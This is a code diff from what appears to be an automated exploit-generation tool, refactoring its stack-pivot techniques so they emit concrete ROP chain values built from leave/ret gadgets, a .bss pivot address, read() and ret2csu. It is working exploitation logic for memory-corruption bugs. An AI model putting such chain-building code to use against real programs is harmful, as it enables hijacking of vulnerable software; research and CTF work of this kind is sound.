@@ -39,28 +39,54 @@ bool BasicStackPivot::checkRequirements() const {
 
 void BasicStackPivot::resolveRequiredGadgets() {
     // Gadgets
-    m_ctx.getExploit().registerGadget("ret", m_ctx.getExploit().resolveGadget("ret"));
-    m_ctx.getExploit().registerGadget("pop_rbp_ret", m_ctx.getExploit().resolveGadget("pop rbp ; ret"));
-    m_ctx.getExploit().registerGadget("leave_ret", m_ctx.getExploit().resolveGadget("leave ; ret"));
+    m_ctx.getExploit().registerSymbol("ret", m_ctx.getExploit().resolveGadget("ret"));
+    m_ctx.getExploit().registerSymbol("pop_rbp_ret", m_ctx.getExploit().resolveGadget("pop rbp ; ret"));
+    m_ctx.getExploit().registerSymbol("leave_ret", m_ctx.getExploit().resolveGadget("leave ; ret"));
 
     // Memory locations
-    m_ctx.getExploit().registerMemLocation("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
+    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
 }
 
 std::string BasicStackPivot::getAuxiliaryFunctions() const {
     return "";
 }
 
-std::vector<std::vector<std::string>> BasicStackPivot::getRopChainsList() const {
+std::vector<std::vector<std::string>> BasicStackPivot::getRopPayloadList() const {
     return {
         {
             "p64(0)",
-            "p64(elf.sym['read'], 0, pivot_dest, 1024)",
+            "uROP(elf.sym['read'], 0, pivot_dest, 1024)",
             "p64(pop_rbp_ret)",
             "p64(pivot_dest)",
             "p64(leave_ret)"
         }
     };
+}
+
+std::vector<std::vector<uint64_t>> BasicStackPivot::getConcretizedRopPayloadList() const {
+    std::vector<uint64_t> part1 = {0};
+
+    Ret2csu *ret2csu = dynamic_cast<Ret2csu *>(Technique::mapper["Ret2csu"]);
+
+    std::vector<uint64_t> part2
+        = ret2csu->getConcretizedRopPayloadList(
+                0,
+                m_ctx.getExploit().getSymbolValue("pivot_dest"),
+                1024,
+                m_ctx.getExploit().getElf().symbols()["read"])[0];
+
+    std::vector<uint64_t> part3 = {
+        m_ctx.getExploit().getSymbolValue("pop_rbp_ret"),
+        m_ctx.getExploit().getSymbolValue("pivot_dest"),
+        m_ctx.getExploit().getSymbolValue("leave_ret")
+    };
+
+    std::vector<uint64_t> ret;
+    ret.reserve(part1.size() + part2.size() + part3.size());
+    ret.insert(ret.end(), part1.begin(), part1.end());
+    ret.insert(ret.end(), part2.begin(), part2.end());
+    ret.insert(ret.end(), part3.begin(), part3.end());
+    return {ret};
 }
 
 std::vector<std::string> BasicStackPivot::getExtraPayload() const {
@@ -85,17 +111,17 @@ bool AdvancedStackPivot::checkRequirements() const {
 
 void AdvancedStackPivot::resolveRequiredGadgets() {
     // Gadgets
-    m_ctx.getExploit().registerGadget("pop_rsi_r15_ret", m_ctx.getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));
+    m_ctx.getExploit().registerSymbol("pop_rsi_r15_ret", m_ctx.getExploit().resolveGadget("pop rsi ; pop r15 ; ret"));
 
     // Memory locations
-    m_ctx.getExploit().registerMemLocation("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
+    m_ctx.getExploit().registerSymbol("pivot_dest", m_ctx.getExploit().getElf().bss() + 0x800);
 }
 
 std::string AdvancedStackPivot::getAuxiliaryFunctions() const {
     return "";
 }
 
-std::vector<std::vector<std::string>> AdvancedStackPivot::getRopChainsList() const {
+std::vector<std::vector<std::string>> AdvancedStackPivot::getRopPayloadList() const {
     const std::vector<uint64_t> &writePrimitives = m_ctx.getWritePrimitives();
     assert(writePrimitives.size());
 
@@ -137,7 +163,7 @@ std::vector<std::vector<std::string>> AdvancedStackPivot::getRopChainsList() con
             "p64(pop_rsi_r15_ret)            # ret",
             "p64(pivot_dest + 8 + 0x30 * 6)  # rsi",
             "p64(0)                          # r15 (dummy)",
-            "p64(elf.sym['read'])            # ret"
+            "p64(elf.sym['read'])            # ret",
         }
     };
 
@@ -146,7 +172,7 @@ std::vector<std::vector<std::string>> AdvancedStackPivot::getRopChainsList() con
     if (!ret2csu) {
         m_ctx.log<WARN>() << "StackPivot: unable to get ret2csu technique!\n";
     } else {
-        std::vector<std::vector<std::string>> r = ret2csu->getRopChainsListWithArgs(
+        std::vector<std::vector<std::string>> r = ret2csu->getRopPayloadList(
             "0",
             "pivot_dest + 8 + 0x30 * 7 - 8",
             "0x400",
@@ -157,7 +183,23 @@ std::vector<std::vector<std::string>> AdvancedStackPivot::getRopChainsList() con
         ret.push_back(std::vector<std::string>(r[0].begin() + 6, r[0].begin() + 12));
         ret.push_back(std::vector<std::string>(r[0].begin() + 12, r[0].end()));
     }
+
     return ret;
+}
+
+std::vector<std::vector<uint64_t>> AdvancedStackPivot::getConcretizedRopPayloadList() const {
+    const std::vector<uint64_t> &writePrimitives = m_ctx.getWritePrimitives();
+    assert(writePrimitives.size());
+
+    // Resolve `ret2LeaRbp`.
+    uint64_t ret2LeaRbp = writePrimitives.front() - determineOffset();
+
+    return {
+        {
+            m_ctx.getExploit().getSymbolValue("pivot_dest"),
+            ret2LeaRbp
+        }
+    };
 }
 
 std::vector<std::string> AdvancedStackPivot::getExtraPayload() const {
